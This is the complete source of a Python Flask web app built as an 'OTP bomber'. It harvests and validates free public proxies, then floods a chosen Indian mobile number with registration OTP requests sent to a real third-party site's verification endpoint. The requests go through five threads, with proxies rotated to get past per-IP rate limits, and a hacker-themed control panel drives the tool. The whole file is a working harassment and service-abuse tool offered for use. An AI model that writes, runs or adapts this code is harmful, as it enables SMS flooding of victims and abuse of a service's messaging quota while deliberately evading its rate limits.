import os
import time
import random
import json
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, jsonify, render_template_string, Response, request

app = Flask(__name__)

# --- GLOBAL STATE ---
STATE = {
    "start_time": time.time(),
    "start_time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "code_200": 0,
    "code_400": 0,
    "proxies_fetched": 0,
    "proxies_dead": 0,
    "proxies_live": 0,
    "logs": [],
    "bombing_active": False,
    "target_number": "",
    "click_count": 0,
    "last_click_time": 0
}

PROXIES_LIVE_QUEUE = []
BG_THREADS_STARTED = False
LOG_LOCK = threading.Lock()
BOMBING_THREADS = []
BOMBING_LOCK = threading.Lock()

# --- LOGGING SYSTEM ---
def log_sys(msg, level="info", target="N/A", proxy="N/A"):
    """Thread-safe logging system that pushes data to the UI."""
    with LOG_LOCK:
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "message": msg,
            "level": level,
            "target": target,
            "proxy": proxy
        }
        STATE["logs"].insert(0, entry)
        if len(STATE["logs"]) > 2000:
            STATE["logs"] = STATE["logs"][:2000]

# --- MULTIPLE PROXY FETCHERS ---
def fetch_raw_proxies():
    """Fetches free proxies from 4 different global sources."""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    
    raw_proxies = set()
    log_sys("SYSTEM: Reaching out to 4 global proxy APIs...", "info")
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().split('\n')
                for line in lines:
                    proxy = line.strip()
                    if ":" in proxy:
                        raw_proxies.add(proxy)
        except Exception as e:
            log_sys(f"SYSTEM: Failed to fetch from {url} - {str(e)}", "warn")

    proxy_list = list(raw_proxies)
    random.shuffle(proxy_list)
    return proxy_list[:500]

def check_single_proxy(proxy):
    """Pings a lightweight endpoint to check if the proxy is actually alive."""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", proxies=proxies, timeout=5)
        if res.status_code == 204:
            PROXIES_LIVE_QUEUE.append(proxy)
            STATE["proxies_live"] += 1
            log_sys(f"VALIDATED: Proxy is ALIVE and added to queue.", "success", proxy=proxy)
        else:
            STATE["proxies_dead"] += 1
    except:
        STATE["proxies_dead"] += 1

def proxy_manager_thread():
    """Background thread that ensures the live proxy queue never runs dry."""
    while True:
        if len(PROXIES_LIVE_QUEUE) < 20:
            log_sys(f"SYSTEM: Live proxy queue low ({len(PROXIES_LIVE_QUEUE)}). Fetching 500 new proxies...", "info")
            new_proxies = fetch_raw_proxies()
            STATE["proxies_fetched"] += len(new_proxies)
            
            log_sys(f"SYSTEM: Downloaded {len(new_proxies)} raw proxies. Spawning 50 threads to verify...", "info")
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(check_single_proxy, new_proxies)
                
            log_sys(f"SYSTEM: Verification complete. Total Live Queue: {len(PROXIES_LIVE_QUEUE)}", "success")
        
        time.sleep(5)

# --- OTP WORKER LOGIC ---
def send_otp_request(proxy, mobile, worker_id=None):
    """Send a single OTP request using the provided proxy."""
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    
    url = "https://cooe03.in/user/send_verify_code"
    payload = {"mobile_number": mobile, "verify_type": "register"}
    headers = {
        "Origin": "https://cooe03.in",
        "Referer": "https://cooe03.in/",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.{random.randint(1, 999)} Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*"
    }

    try:
        res = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=10)
        
        try:
            data = res.json()
            code = data.get("code", res.status_code)
        except:
            code = res.status_code

        if code == 200:
            STATE["code_200"] += 1
            log_sys(f"STATUS 200: OTP Packet delivered.", "success", target=mobile, proxy=proxy)
            return True
        elif code == 400:
            STATE["code_400"] += 1
            log_sys(f"STATUS 400: IP limit reached. Proxy burned.", "error", target=mobile, proxy=proxy)
            return False
        else:
            log_sys(f"UNKNOWN {code}: Bad response. Burning proxy.", "warn", target=mobile, proxy=proxy)
            return False
    except Exception as e:
        log_sys(f"TIMEOUT/DROP: Proxy disconnected. Burning.", "error", target=mobile, proxy=proxy)
        return False

def bomber_worker(worker_id, target_number):
    """Worker thread for bombing mode - sends OTPs continuously."""
    while STATE["bombing_active"]:
        if not PROXIES_LIVE_QUEUE:
            time.sleep(2)
            continue
            
        proxy = PROXIES_LIVE_QUEUE.pop(0)
        STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
        
        success = send_otp_request(proxy, target_number, worker_id)
        
        if not success:
            # Proxy was burned, continue to next one
            continue
        
        time.sleep(1)  # Small delay between requests

def single_otp_worker(target_number):
    """Send a single OTP to the target number."""
    if not PROXIES_LIVE_QUEUE:
        log_sys("ERROR: No live proxies available!", "error")
        return {"success": False, "message": "No live proxies available"}
    
    proxy = PROXIES_LIVE_QUEUE.pop(0)
    STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
    
    success = send_otp_request(proxy, target_number)
    
    if success:
        return {"success": True, "message": "OTP sent successfully"}
    else:
        return {"success": False, "message": "Failed to send OTP"}

def start_bombing(target_number):
    """Start the bombing process with 5 worker threads."""
    global BOMBING_THREADS
    with BOMBING_LOCK:
        if STATE["bombing_active"]:
            return {"success": False, "message": "Bombing already active"}
        
        STATE["bombing_active"] = True
        STATE["target_number"] = target_number
        BOMBING_THREADS = []
        
        for i in range(5):  # 5 concurrent workers for bombing
            thread = threading.Thread(target=bomber_worker, args=(i, target_number), daemon=True)
            thread.start()
            BOMBING_THREADS.append(thread)
        
        log_sys(f"BOMBING STARTED on {target_number} with 5 workers", "success", target=target_number)
        return {"success": True, "message": "Bombing started"}

def stop_bombing():
    """Stop the bombing process."""
    global BOMBING_THREADS
    with BOMBING_LOCK:
        if not STATE["bombing_active"]:
            return {"success": False, "message": "No bombing active"}
        
        STATE["bombing_active"] = False
        STATE["target_number"] = ""
        BOMBING_THREADS = []
        
        log_sys("BOMBING STOPPED", "info")
        return {"success": True, "message": "Bombing stopped"}

# --- FLASK SERVER & BOOTSTRAP ---
def init_background_threads():
    global BG_THREADS_STARTED
    if not BG_THREADS_STARTED:
        log_sys("SYSTEM: Initializing background routing threads...", "info")
        threading.Thread(target=proxy_manager_thread, daemon=True).start()
        BG_THREADS_STARTED = True

@app.before_request
def activate_threads():
    init_background_threads()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    """Send a single OTP to the provided number."""
    data = request.get_json()
    mobile = data.get('mobile', '').strip()
    
    if not mobile:
        return jsonify({"success": False, "message": "Mobile number required"})
    
    # Validate Indian mobile number format
    if not mobile.startswith('+91') or len(mobile) != 13:
        return jsonify({"success": False, "message": "Invalid number. Use +91XXXXXXXXXX format"})
    
    result = single_otp_worker(mobile)
    return jsonify(result)

@app.route('/api/start_bombing', methods=['POST'])
def start_bombing_route():
    """Start bombing the provided number."""
    data = request.get_json()
    mobile = data.get('mobile', '').strip()
    
    if not mobile:
        return jsonify({"success": False, "message": "Mobile number required"})
    
    if not mobile.startswith('+91') or len(mobile) != 13:
        return jsonify({"success": False, "message": "Invalid number. Use +91XXXXXXXXXX format"})
    
    result = start_bombing(mobile)
    return jsonify(result)

@app.route('/api/stop_bombing', methods=['POST'])
def stop_bombing_route():
    """Stop the bombing process."""
    result = stop_bombing()
    return jsonify(result)

@app.route('/api/status')
def bombing_status():
    """Get current bombing status."""
    return jsonify({
        "bombing_active": STATE["bombing_active"],
        "target_number": STATE["target_number"]
    })

@app.route('/api/stats')
def stats():
    uptime_seconds = int(time.time() - STATE["start_time"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
        "started_at": STATE["start_time_str"],
        "code_200": STATE["code_200"],
        "code_400": STATE["code_400"],
        "proxies_fetched": STATE["proxies_fetched"],
        "proxies_dead": STATE["proxies_dead"],
        "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
        "bombing_active": STATE["bombing_active"],
        "target_number": STATE["target_number"],
        "logs": STATE["logs"][:80]
    })

@app.route('/api/export')
def export_data():
    def generate():
        yield json.dumps({
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {
                "total_200": STATE["code_200"],
                "total_400": STATE["code_400"],
                "proxies_fetched": STATE["proxies_fetched"],
                "proxies_dead": STATE["proxies_dead"]
            },
            "activity_logs": STATE["logs"]
        }, indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=otp_traffic_logs.json'})

@app.route('/api/title_click', methods=['POST'])
def title_click():
    """Track title clicks for JSON download."""
    current_time = time.time()
    
    # Reset if more than 5 seconds between clicks
    if current_time - STATE["last_click_time"] > 5:
        STATE["click_count"] = 1
    else:
        STATE["click_count"] += 1
    
    STATE["last_click_time"] = current_time
    
    # If 10 clicks in 5 seconds, trigger download
    if STATE["click_count"] >= 10:
        STATE["click_count"] = 0
        return jsonify({"download": True})
    
    return jsonify({"download": False})

# --- UI TEMPLATE (Cyber Hacker Vibe) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // PROXY-OTP BOMB</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            letter-spacing: 2px;
            cursor: pointer;
            user-select: none;
        }
        h1:hover {
            text-shadow: 0 0 20px #00ff00;
        }
        .header-info {
            text-align: center;
            margin-bottom: 20px;
            color: #00ffff;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            background: rgba(0, 255, 0, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .stat-value {
            font-size: 26px;
            font-weight: bold;
            margin-top: 10px;
            text-shadow: 0 0 5px #00ff00;
        }
        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); }
        .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
        
        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
        .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }

        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); }
        .box-gray .stat-value { text-shadow: 0 0 5px #888; }

        .input-section {
            background: #000;
            border: 1px solid #00ff00;
            padding: 20px;
            margin: 20px 0;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.1);
        }
        .input-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            align-items: center;
            justify-content: center;
        }
        .input-group input {
            flex: 1;
            min-width: 200px;
            padding: 12px 15px;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus {
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }
        .input-group input::placeholder {
            color: #006600;
        }
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        .btn {
            padding: 12px 25px;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .btn-danger {
            border-color: #ff3333;
            color: #ff3333;
        }
        .btn-danger:hover {
            background: #ff3333;
            color: #000;
            box-shadow: 0 0 15px #ff3333;
        }
        .btn-warning {
            border-color: #ffcc00;
            color: #ffcc00;
        }
        .btn-warning:hover {
            background: #ffcc00;
            color: #000;
            box-shadow: 0 0 15px #ffcc00;
        }
        .btn-telegram {
            border-color: #0088cc;
            color: #0088cc;
            background: #000;
        }
        .btn-telegram:hover {
            background: #0088cc;
            color: #fff;
            box-shadow: 0 0 15px #0088cc;
        }
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
            box-sizing: border-box;
            margin-top: 10px;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        .terminal-container {
            margin-top: 20px;
            background: #000;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
            padding: 15px;
            height: 400px;
            overflow-y: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #003300;
            font-size: 13px;
        }
        th {
            background: #002200;
            position: sticky;
            top: 0;
            color: #fff;
        }
        .level-system { color: #00ffff; }
        .level-success { color: #00ff00; }
        .level-error { color: #ff3333; }
        .level-warn { color: #ffcc00; }
        .level-info { color: #aaaaaa; }
        
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }
        .status-active {
            background: #ff3333;
            animation: blink 0.5s infinite;
        }
        .status-inactive {
            background: #006600;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>

    <h1 id="title_click">[ SYS.TERMINAL // PROXY-OTP ROUTER ]</h1>
    <div class="header-info">
        SERVER STARTED: <span id="val_started">--</span> | UPTIME: <span id="val_uptime">--</span>
        <span id="bombing_status" style="margin-left: 20px;">
            <span class="status-indicator status-inactive" id="status_indicator"></span>
            <span id="status_text">IDLE</span>
        </span>
    </div>

    <div class="input-section">
        <div class="input-group">
            <input type="text" id="mobile_input" placeholder="+91XXXXXXXXXX" maxlength="13">
            <div class="btn-group">
                <button class="btn" id="send_otp_btn">SEND OTP</button>
                <button class="btn btn-warning" id="start_bomb_btn">▶ BOMBER</button>
                <button class="btn btn-danger" id="stop_bomb_btn" disabled>⏹ STOP</button>
                <button class="btn btn-telegram" id="telegram_btn" onclick="window.open('https://t.me/Hamza3895', '_blank')">✈ CONTACT</button>
            </div>
        </div>
        <div id="message_area" style="margin-top: 10px; color: #00ff00; text-align: center;"></div>
    </div>

    <div class="stats-grid">
        <div class="stat-box box-cyan">
            <div>PROXIES FETCHED</div>
            <div class="stat-value" id="val_fetched">0</div>
        </div>
        <div class="stat-box">
            <div>PROXIES LIVE QUEUE</div>
            <div class="stat-value" id="val_live">0</div>
        </div>
        <div class="stat-box box-gray">
            <div>PROXIES DEAD</div>
            <div class="stat-value" id="val_dead">0</div>
        </div>
        <div class="stat-box">
            <div>CODE 200 (SUCCESS)</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box box-red">
            <div>CODE 400 (LIMIT HIT)</div>
            <div class="stat-value" id="val_400">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>

    <div class="terminal-container">
        <table>
            <thead>
                <tr>
                    <th width="10%">TIME</th>
                    <th width="45%">EVENT LOG</th>
                    <th width="20%">TARGET (MOBILE)</th>
                    <th width="25%">ROUTED PROXY</th>
                </tr>
            </thead>
            <tbody id="log_body">
                <tr><td colspan="4">Initializing system... Please refresh the page if logs do not appear.</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        let bombingActive = false;
        let clickCount = 0;
        let lastClickTime = 0;

        // Title click handler for JSON download
        document.getElementById('title_click').addEventListener('click', function() {
            const currentTime = Date.now() / 1000;
            
            if (currentTime - lastClickTime > 5) {
                clickCount = 1;
            } else {
                clickCount++;
            }
            
            lastClickTime = currentTime;
            
            if (clickCount >= 10) {
                clickCount = 0;
                // Trigger JSON download
                window.open('/api/export', '_blank');
            }
        });

        function showMessage(msg, isError = false) {
            const area = document.getElementById('message_area');
            area.textContent = msg;
            area.style.color = isError ? '#ff3333' : '#00ff00';
            setTimeout(() => {
                area.textContent = '';
            }, 5000);
        }

        function updateBombingStatus(active) {
            bombingActive = active;
            const indicator = document.getElementById('status_indicator');
            const text = document.getElementById('status_text');
            const startBtn = document.getElementById('start_bomb_btn');
            const stopBtn = document.getElementById('stop_bomb_btn');
            
            if (active) {
                indicator.className = 'status-indicator status-active';
                text.textContent = 'BOMBING ACTIVE';
                text.style.color = '#ff3333';
                startBtn.disabled = true;
                stopBtn.disabled = false;
            } else {
                indicator.className = 'status-indicator status-inactive';
                text.textContent = 'IDLE';
                text.style.color = '#00ff00';
                startBtn.disabled = false;
                stopBtn.disabled = true;
            }
        }

        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_started').innerText = data.started_at;
                    document.getElementById('val_fetched').innerText = data.proxies_fetched;
                    document.getElementById('val_live').innerText = data.proxies_live_queue;
                    document.getElementById('val_dead').innerText = data.proxies_dead;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_400').innerText = data.code_400;

                    // Update bombing status
                    if (data.bombing_active !== bombingActive) {
                        updateBombingStatus(data.bombing_active);
                    }

                    const tbody = document.getElementById('log_body');
                    tbody.innerHTML = ''; 
                    
                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.className = `level-${log.level}`;
                        tr.innerHTML = `
                            <td>${log.time}</td>
                            <td>${log.message}</td>
                            <td>${log.target}</td>
                            <td>${log.proxy}</td>
                        `;
                        tbody.appendChild(tr);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        // SEND OTP
        document.getElementById('send_otp_btn').addEventListener('click', function() {
            const mobile = document.getElementById('mobile_input').value.trim();
            
            if (!mobile) {
                showMessage('Please enter a mobile number', true);
                return;
            }
            
            if (!mobile.startsWith('+91') || mobile.length !== 13) {
                showMessage('Invalid format. Use +91XXXXXXXXXX', true);
                return;
            }
            
            this.disabled = true;
            showMessage('Sending OTP...');
            
            fetch('/api/send_otp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({mobile: mobile})
            })
            .then(res => res.json())
            .then(data => {
                this.disabled = false;
                if (data.success) {
                    showMessage('✓ OTP sent successfully!');
                } else {
                    showMessage('✗ ' + data.message, true);
                }
            })
            .catch(err => {
                this.disabled = false;
                showMessage('✗ Error sending OTP', true);
            });
        });

        // START BOMBING
        document.getElementById('start_bomb_btn').addEventListener('click', function() {
            const mobile = document.getElementById('mobile_input').value.trim();
            
            if (!mobile) {
                showMessage('Please enter a mobile number', true);
                return;
            }
            
            if (!mobile.startsWith('+91') || mobile.length !== 13) {
                showMessage('Invalid format. Use +91XXXXXXXXXX', true);
                return;
            }
            
            this.disabled = true;
            showMessage('Starting bombing...');
            
            fetch('/api/start_bombing', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({mobile: mobile})
            })
            .then(res => res.json())
            .then(data => {
                this.disabled = false;
                if (data.success) {
                    showMessage('✓ Bombing started on ' + mobile);
                    updateBombingStatus(true);
                } else {
                    showMessage('✗ ' + data.message, true);
                }
            })
            .catch(err => {
                this.disabled = false;
                showMessage('✗ Error starting bombing', true);
            });
        });

        // STOP BOMBING
        document.getElementById('stop_bomb_btn').addEventListener('click', function() {
            this.disabled = true;
            showMessage('Stopping bombing...');
            
            fetch('/api/stop_bombing', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(res => res.json())
            .then(data => {
                this.disabled = false;
                if (data.success) {
                    showMessage('✓ Bombing stopped');
                    updateBombingStatus(false);
                } else {
                    showMessage('✗ ' + data.message, true);
                }
            })
            .catch(err => {
                this.disabled = false;
                showMessage('✗ Error stopping bombing', true);
            });
        });

        // Check bombing status on load
        fetch('/api/status')
            .then(res => res.json())
            .then(data => {
                if (data.bombing_active) {
                    updateBombingStatus(true);
                }
            });

        // Poll API every 1.5 seconds
        setInterval(fetchStats, 1500);
        setTimeout(fetchStats, 500);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    init_background_threads()
    app.run(host='0.0.0.0', port=port)
